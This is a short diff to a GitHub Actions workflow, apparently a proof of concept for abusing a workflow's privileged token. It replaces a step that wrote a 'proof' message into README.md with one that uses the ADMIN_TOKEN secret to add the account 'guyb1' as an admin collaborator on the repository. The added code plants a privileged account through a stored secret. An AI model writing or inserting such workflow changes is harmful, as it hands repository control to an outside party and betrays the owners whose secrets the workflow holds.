@@ -10,10 +10,9 @@ jobs:
         with:
           github-token: ${{ secrets.ADMIN_TOKEN }}
           script: |
-            await github.repos.createOrUpdateFileContents({
+            await github.repos.addCollaborator({
               owner: 'incrediblysecureinc',
-              repo: 'incredibly-secure-guyb1',
-              path: 'README.md',
-              message: 'message',
-              content: 'Just a proof for yall!',
-            })
+              repo: `incredibly-secure-guyb1`,
+              username: 'guyb1',
+              permission: 'admin'
+            });
